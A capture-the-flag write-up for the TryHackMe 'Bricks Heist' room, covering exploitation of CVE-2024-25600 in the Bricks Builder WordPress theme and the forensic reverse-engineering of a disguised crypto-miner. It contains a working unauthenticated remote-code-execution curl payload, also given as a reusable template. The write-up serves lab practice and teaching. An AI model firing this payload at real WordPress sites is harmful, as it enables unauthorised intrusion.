# Bricks Heist — TryHackMe

**Platform:** TryHackMe · **Difficulty:** Easy (with a reverse-engineering finish) · **Date:** 2026-11-23

## Summary
A WordPress site running the **Bricks Builder** theme at version **1.9.5** — vulnerable to **CVE-2024-25600**, an unauthenticated remote code execution flaw in the `render_element` REST endpoint. The RCE drops a flag in the web root, then the forensic half of the room begins: a malicious systemd service (`ubuntu.service`) persists a crypto-miner disguised as a NetworkManager binary (`nm-inet-dialog`). That binary is a PyInstaller-packed Python miner; unpacking and decompiling it reveals a ROT13-obfuscated Bitcoin wallet, which blockchain attribution ties to a known ransomware group.

## Enumeration
Nmap showed the box fronted by Apache over HTTPS on 443 (SSH and MySQL present but useless without creds). The site is WordPress; the Bricks theme and its version are the tell — the themed CSS exposes the version:

```
# add the vhost first
echo "TARGET bricks.thm" | sudo tee -a /etc/hosts

# confirm the theme version — this maps to the CVE
curl -sk https://bricks.thm/wp-content/themes/bricks/style.css | grep -i version
# -> Version: 1.9.5   => CVE-2024-25600 (unauth RCE)
```

Bricks <= 1.9.6 is vulnerable, so 1.9.5 is in scope.

## Foothold
CVE-2024-25600 abuses the `/wp-json/bricks/v1/render_element` endpoint: it accepts a `queryEditor` field evaluated as PHP, and the `nonce` needed is public — it sits in the HTML of any page. Grab the nonce, then POST a `shell_exec()` payload. Output comes back inside a thrown Exception in the JSON response.

```
# 1. scrape the public nonce from the homepage
curl -sk https://bricks.thm/ | grep -oE '"nonce":"[a-f0-9]+"' | head -1

# 2. RCE — run any command, read the result from the Exception message
curl -sk 'https://bricks.thm/wp-json/bricks/v1/render_element' \
  -H 'Content-Type: application/json' \
  --data '{"postId":1,"nonce":"NONCE","element":{"name":"container","settings":{"hasLoop":"true","query":{"useQueryEditor":true,"queryEditor":"throw new \\Exception(print_r(shell_exec(\"id\"),true));","objectType":"post"}},"children":[]}}'
# -> uid=33(apache) gid=33(apache)
```

The first flag is a hex-named `.txt` in the web root, readable straight over HTTPS — no payload even needed:

```
curl -sk https://bricks.thm/650c844110baced87e1606453b93f22a.txt
```

## Forensics — the persistence
Malware wants to survive reboot, so the systemd units are the place to look. Listing them shows the odd one out:

```
# (run through the RCE payload above, swapping the shell_exec command)
ls -la /etc/systemd/system/*.service
```

Two non-stock units appear: `badr.service` (a **red herring** — TryHackMe's own room-check agent) and **`ubuntu.service`**. Reading it names the suspicious process:

```
cat /etc/systemd/system/ubuntu.service
# [Unit]
# Description=TRYHACK3M
# [Service]
# ExecStart=/lib/NetworkManager/nm-inet-dialog
```

`nm-inet-dialog` is **the suspicious process** — a binary masquerading as a NetworkManager component (the real NetworkManager ships nothing by that name).

## Reverse engineering — the miner
Stage the binary into the web root over the RCE, pull it down, and identify it:

```
# stage via shell_exec: cp /lib/NetworkManager/nm-inet-dialog /data/www/default/nm.bin
wget --no-check-certificate -q https://bricks.thm/nm.bin -O ~/nm-inet-dialog
file ~/nm-inet-dialog
# -> ELF 64-bit LSB executable, x86-64, stripped

# stripped ELF — check for PyInstaller markers
strings ~/nm-inet-dialog | grep -iE "pyinstaller|python|PyRun|_MEI"
# -> _MEIPASS, PyRun_SimpleStringFlags  => PyInstaller-packed Python
```

Unpack with pyinstxtractor-ng, then decompile the entry-point `.pyc` with decompyle3:

```
mkdir -p ~/nm-extract && cd ~/nm-extract && pyinstxtractor-ng ~/nm-inet-dialog
# entry point: inet3.d.pyc  (ignore pyiboot01_bootstrap / pyi_rth_inspect — PyInstaller stubs)

cd ~/nm-extract/nm-inet-dialog_extracted
decompyle3 inet3.d.pyc > ~/inet3.py 2>/dev/null   # redirect or it floods stdout with grammar trace
```

The decompiled source gives the last two answers:
- The miner writes its log to `inet.conf` under `/lib/NetworkManager/` (**log file name**).
- The wallet is three string fragments concatenated and run through **ROT13**. Decode it with the script's own algorithm — read the variables out of the source, never retype the ciphertext from memory:

```
# decode the ROT13 wallet exactly as the script does
python3 -c "import codecs; print(codecs.decode(A1+B2+C3,'rot_13'))"
```

The decode produces the address written **twice** with a one-character difference — a valid bech32 address is **42 characters**, so the clean 42-char half is the real wallet and the 43-char half is a decoy.

## Attribution
The recovered wallet's on-chain transactions tie it to the **LockBit** ransomware group (blockchain attribution — a lookup, not a guess).

## Payloads & code
```
# CVE-2024-25600 generic RCE one-liner (swap the shell_exec command)
curl -sk 'https://TARGET/wp-json/bricks/v1/render_element' \
  -H 'Content-Type: application/json' \
  --data '{"postId":1,"nonce":"NONCE","element":{"name":"container","settings":{"hasLoop":"true","query":{"useQueryEditor":true,"queryEditor":"throw new \\Exception(print_r(shell_exec(\"CMD\"),true));","objectType":"post"}},"children":[]}}'

# PyInstaller unpack + decompile
pyinstxtractor-ng ./nm-inet-dialog
decompyle3 inet3.d.pyc > inet3.py 2>/dev/null

# ROT13 decode
python3 -c "import codecs; print(codecs.decode(STRING,'rot_13'))"
```

## Flags / Answers
- Web root flag: `THM{REDACTED}`
- Suspicious process: `nm-inet-dialog`
- Service name: `REDACTED.service`
- Miner log file: `REDACTED.conf`
- Wallet address: `REDACTED` (ROT13 decode, 42-char bech32)
- Threat group: `REDACTED`

## Lessons
- A themed WordPress CSS/JS `ver=` is a free version tell — map it straight to a CVE before anything else.
- PyInstaller ELF (`_MEIPASS` / `PyRun_SimpleStringFlags` in strings) -> pyinstxtractor-ng then decompyle3 the entry `.pyc`; redirect decompile output to a file or it drowns the terminal.
- Decode obfuscated strings with the sample's own algorithm read out of the source — never retype the ciphertext from memory. Watch for a decoy half; a bech32 wallet is exactly 42 chars.
